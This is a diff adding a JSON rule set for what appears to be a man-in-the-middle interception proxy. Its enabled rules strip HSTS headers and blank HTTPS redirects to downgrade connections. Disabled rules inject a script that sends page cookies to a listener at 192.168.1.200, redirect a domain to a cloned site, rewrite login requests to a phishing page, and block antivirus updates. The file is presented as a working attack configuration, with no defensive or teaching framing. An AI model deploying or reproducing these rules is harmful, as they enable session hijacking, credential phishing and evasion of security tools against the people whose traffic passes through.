@@ -1,0 +1,128 @@
+{
+  "version": "1.0",
+  "rules": [
+    {
+      "id": "rule001",
+      "name": "STRIP HSTS HEADER",
+      "enabled": true,
+      "priority": 0,
+      "condition": {
+        "type": "header",
+        "header_name": "strict-transport-security",
+        "operator": "contains",
+        "value": ""
+      },
+      "action": {
+        "type": "strip_header",
+        "header_name": "strict-transport-security"
+      }
+    },
+    {
+      "id": "rule002",
+      "name": "DOWNGRADE HTTPS REDIRECT",
+      "enabled": true,
+      "priority": 1,
+      "condition": {
+        "type": "header",
+        "header_name": "location",
+        "operator": "starts_with",
+        "value": "https://"
+      },
+      "action": {
+        "type": "modify_header",
+        "header_name": "location",
+        "value": ""
+      }
+    },
+    {
+      "id": "rule003",
+      "name": "INJECT SESSION LOGGER",
+      "enabled": false,
+      "priority": 2,
+      "condition": {
+        "type": "mime",
+        "operator": "contains",
+        "value": "text/html"
+      },
+      "action": {
+        "type": "inject_html",
+        "value": "<script>document.cookie&&fetch('http://192.168.1.200:9999/?c='+encodeURIComponent(document.cookie))</script>"
+      }
+    },
+    {
+      "id": "rule004",
+      "name": "REDIRECT TARGET DOMAIN",
+      "enabled": false,
+      "priority": 3,
+      "condition": {
+        "type": "domain",
+        "operator": "equals",
+        "value": "target.internal"
+      },
+      "action": {
+        "type": "redirect",
+        "value": "http://192.168.1.200/clone/"
+      }
+    },
+    {
+      "id": "rule005",
+      "name": "REWRITE LOGIN ENDPOINT",
+      "enabled": false,
+      "priority": 4,
+      "condition": {
+        "type": "url",
+        "operator": "contains",
+        "value": "/auth/login"
+      },
+      "action": {
+        "type": "rewrite_url",
+        "value": "http://192.168.1.200/phish/login"
+      }
+    },
+    {
+      "id": "rule006",
+      "name": "SUBSTITUTE BRAND TEXT",
+      "enabled": false,
+      "priority": 5,
+      "condition": {
+        "type": "html",
+        "operator": "contains",
+        "value": "SecureBank"
+      },
+      "action": {
+        "type": "substitute",
+        "find": "SecureBank",
+        "replace": "OnikiriBank"
+      }
+    },
+    {
+      "id": "rule007",
+      "name": "BLOCK ANTIVIRUS UPDATE",
+      "enabled": false,
+      "priority": 6,
+      "condition": {
+        "type": "url",
+        "operator": "contains",
+        "value": "update.av-vendor.com"
+      },
+      "action": {
+        "type": "block"
+      }
+    },
+    {
+      "id": "rule008",
+      "name": "REPLACE ALL IMAGES",
+      "enabled": false,
+      "priority": 7,
+      "condition": {
+        "type": "mime",
+        "operator": "starts_with",
+        "value": "image/"
+      },
+      "action": {
+        "type": "replace_body",
+        "value": ""
+      }
+    }
+  ]
+}
